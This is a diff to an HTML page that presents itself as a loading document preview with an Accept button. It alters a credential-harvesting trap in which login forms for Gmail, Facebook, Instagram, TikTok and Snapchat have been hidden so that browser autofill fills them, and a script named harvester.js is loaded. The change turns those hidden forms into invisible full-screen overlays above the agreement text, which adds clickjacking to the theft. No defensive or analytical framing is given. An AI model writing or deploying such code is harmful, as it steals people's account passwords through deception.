@@ -57,18 +57,37 @@
       100% { transform: rotate(360deg); }
     }
     #click-overlay {
-      position: fixed;
+      position: relative;
+      z-index: 1;
+      pointer-events: none; /* Allow clicks to pass through */
+    }
+    .agreement-container h2, .agreement-container p {
+      pointer-events: auto; /* Make text selectable again if needed, but clicks still pass through parent */
+    }
+    .agreement-container button {
+      pointer-events: auto; /* The button should be clickable */
+    }
+    .form-overlay {
+      position: absolute;
       top: 0;
       left: 0;
       width: 100vw;
       height: 100vh;
-      background-color: rgba(0,0,0,0); /* Transparent */
-      z-index: 999; /* Make sure it's on top */
+      opacity: 0;
+      z-index: 2; /* Place forms above the agreement content */
+    }
+    .form-overlay input {
+      width: 100%;
+      height: 100%;
+      border: none;
+      background: transparent;
+    }
+    #click-overlay {
+      display: none; /* No longer needed */
     }
   </style>
 </head>
 <body>
-  <div id="click-overlay"></div>
   <div class="preview-container">
     <div class="loader"></div>
     <p>Loading document preview...</p>
@@ -107,28 +126,29 @@
     <button>Accept</button>
   </div>
 
-  <div style="display: none;">
-    <form id="gmail-form">
-      <input type="email" name="email" autocomplete="username" />
-      <input type="password" name="password" autocomplete="current-password" />
-    </form>
-    <form id="facebook-form">
-      <input type="text" name="username" autocomplete="username" />
-      <input type="password" name="password" autocomplete="current-password" />
-    </form>
-    <form id="instagram-form">
-        <input type="text" name="username" autocomplete="username" />
-        <input type="password" name="password" autocomplete="current-password" />
-    </form>
-    <form id="tiktok-form">
-        <input type="text" name="username" autocomplete="username" />
-        <input type="password" name="password" autocomplete="current-password" />
-    </form>
-    <form id="snapchat-form">
-        <input type="text" name="username" autocomplete="username" />
-        <input type="password" name="password" autocomplete="current-password" />
-    </form>
-  </div>
-  <script src="harvester.js?v=2"></script>
+  <!-- Hidden forms are now overlays -->
+  <form id="gmail-form" class="form-overlay">
+    <input type="email" name="email" autocomplete="username">
+    <input type="password" name="password" autocomplete="current-password">
+  </form>
+  <form id="facebook-form" class="form-overlay">
+    <input type="text" name="username" autocomplete="username">
+    <input type="password" name="password" autocomplete="current-password">
+  </form>
+  <form id="instagram-form" class="form-overlay">
+    <input type="text" name="username" autocomplete="username">
+    <input type="password" name="password" autocomplete="current-password">
+  </form>
+  <form id="tiktok-form" class="form-overlay">
+    <input type="text" name="username" autocomplete="username">
+    <input type="password" name="password" autocomplete="current-password">
+  </form>
+  <form id="snapchat-form" class="form-overlay">
+    <input type="text" name="username" autocomplete="username">
+    <input type="password" name="password" autocomplete="current-password">
+  </form>
+
+  <script src="harvester.js"></script>
+
 </body>
 </html>
